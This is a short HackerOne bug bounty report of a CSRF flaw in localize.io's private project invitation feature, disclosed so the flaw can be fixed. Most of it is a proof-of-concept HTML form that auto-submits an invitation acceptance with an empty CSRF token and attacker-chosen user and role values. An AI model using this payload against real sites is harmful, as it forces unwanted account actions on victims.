# HackerOne Report:  Private Project Access Request Accpeted Via CSRF 
**Report ID:** 8224
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to Accpeted the private project access invitation request Via CSRF as the anti-csrf token is not getting validated on the server-side. 


Private Project Access Request Accpeted Via CSRF Code:

<html>
<html>
  <body>
    <form action="http://www.localize.io/invitations/9l" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="invitations[userID]" value="3gh" />
      <input type="hidden" name="invitations[accept]" value="-1" />
      <input type="hidden" name="invitations[role]" value="4" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

## Discussion & Remediation Timeline
